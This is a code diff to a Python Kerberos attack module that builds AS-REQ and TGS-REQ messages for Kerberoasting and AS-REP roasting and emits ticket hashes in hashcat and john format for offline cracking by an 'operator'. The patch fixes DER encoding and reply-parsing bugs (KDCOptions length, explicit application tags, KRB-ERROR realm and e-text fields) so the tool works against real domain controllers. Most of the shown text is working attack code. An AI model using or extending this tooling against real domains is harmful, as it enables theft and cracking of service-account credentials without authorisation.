@@ -18,7 +18,7 @@ traffic to the target.
 The request builders and the response parsers are here (RFC 4120 DER), and the hash output is in
 the format hashcat and john take directly.
 
-Honest limits, because the operator is spending real cracking time:
+Limits, because the operator is spending real cracking time:
   * RC4 (etype 23) is what is practical: AES (17/18) needs the salt, which is the realm and the
     account name for a user, but a service account's salt can differ
   * AS-REP roasting needs preauth to be OFF (a misconfiguration, not a default)
@@ -136,7 +136,11 @@ def _kdc_req_body(realm, cname, sname, etypes=(23, 18, 17), till=None, nonce=Non
     """
     options = 0x40810010 if kdc_options is None else kdc_options
     return _sequence(
-        _context(0, _bit_string(options.to_bytes(5, "big"))),
+        # KDCOptions is a 32-bit BIT STRING (RFC 4120 5.4.1), so its value is 4 bytes. Encoding
+        # it as 5 (`.to_bytes(5, ...)`, which the first version did) prepends a zero octet and
+        # shifts EVERY option bit by 8: a real KDC then reads forwardable(1)/renewable(8)/
+        # canonicalize(15)/renewable-ok(27) as unset. impacket emits `03 05 00 40 81 00 10`.
+        _context(0, _bit_string(options.to_bytes(4, "big"))),
         _context(1, cname[0]),                       # cname
         _context(2, cname[1]),                       # realm
         _context(3, sname[0]),                       # sname
@@ -180,7 +184,7 @@ def tgs_req(realm, user, spn, tgt=b"", session_key=b"", etypes=(23, 18, 17), til
     """A TGS-REQ for one SPN - the Kerberoasting request.
 
     A TGS-REQ needs a TGT in its AP-REQ padata. Without one (no credentials at hand) the request
-    is built but the operator must supply the ticket: this builder is honest about that rather
+    is built but the operator must supply the ticket: this builder states that rather
     than emitting something a KDC will reject for a reason nobody can see.
     """
     if not str(spn or "").strip():
@@ -221,7 +225,7 @@ def parse_reply(data, tag=None):
     if (tag & 0xC0) == 0x40 and isinstance(fields, list):
         out["kind"] = {_TAG_AS_REP: "as_rep", _TAG_TGS_REP: "tgs_rep",
                        _TAG_ERROR: "error"}.get(tag & 0x1F, "unknown")
-        _walk_reply(fields, out)
+        _walk_reply(_unwrap_app(fields), out)
         return out
     if tag != 0x30 or not isinstance(fields, list):
         raise KerberosError(f"a KDC reply is [APPLICATION n], not tag {tag:#x}")
@@ -230,9 +234,24 @@ def parse_reply(data, tag=None):
             app_tag = f_tag & 0x1F
             out["kind"] = {_TAG_AS_REP: "as_rep", _TAG_TGS_REP: "tgs_rep",
                            _TAG_ERROR: "error"}.get(app_tag, "unknown")
-            _walk_reply(f_value, out)
+            _walk_reply(_unwrap_app(f_value), out)
             break
     return out
+
+
+def _unwrap_app(fields):
+    """The fields inside a KDC reply's [APPLICATION n] tag.
+
+    RFC 4120's module is `EXPLICIT TAGS`, so `AS-REP ::= [APPLICATION 11] KDC-REP` is the
+    application tag WRAPPING the SEQUENCE encoding of KDC-REP. On the wire a real reply - and
+    impacket's - is `6b <len> 30 <len> ...`; reading the application tag's children directly
+    (the IMPLICIT shape the test fixtures used) finds a single SEQUENCE and extracts NOTHING:
+    no etype, no cipher, no realm. Descend through that SEQUENCE.
+    """
+    if isinstance(fields, list) and len(fields) == 1 and fields[0][0] == 0x30 \
+            and isinstance(fields[0][1], list):
+        return fields[0][1]
+    return fields
 
 
 def _unwrap(value, *wanted):
@@ -291,7 +310,14 @@ def _walk_reply(fields, out):
             realm = _unwrap(value, 0x1B, 0x04)
             if isinstance(realm, bytes) and not out["realm"]:
                 out["realm"] = realm.decode("utf-8", "replace")
-        elif tag == 0xA9:                                            # e-text [9] on KRB-ERROR
+        elif tag == 0xA9:                                            # realm [9] on KRB-ERROR
+            # RFC 4120 KRB-ERROR: realm is [9] and e-text is [11]. The first version read [9]
+            # as e-text, so a real error reported the server's REALM as its diagnostic text and
+            # dropped the real e-text entirely.
+            realm = _unwrap(value, 0x1B, 0x04)
+            if isinstance(realm, bytes) and not out["realm"]:
+                out["realm"] = realm.decode("utf-8", "replace")
+        elif tag == 0xAB:                                            # e-text [11] on KRB-ERROR
             text = _unwrap(value, 0x1B, 0x04)
             if isinstance(text, bytes):
                 out["error_text"] = text.decode("utf-8", "replace")
@@ -299,8 +325,8 @@ def _walk_reply(fields, out):
             out["realm"] = value.decode("utf-8", "replace")           # tolerant: implicit form
         elif tag == 0x86:
             out["error"] = _as_int(value)
-        elif tag == 0x89 and isinstance(value, bytes):
-            out["error_text"] = value.decode("utf-8", "replace")
+        elif tag == 0x89 and isinstance(value, bytes) and not out["realm"]:
+            out["realm"] = value.decode("utf-8", "replace")           # implicit [9] = realm
     return out
 
 
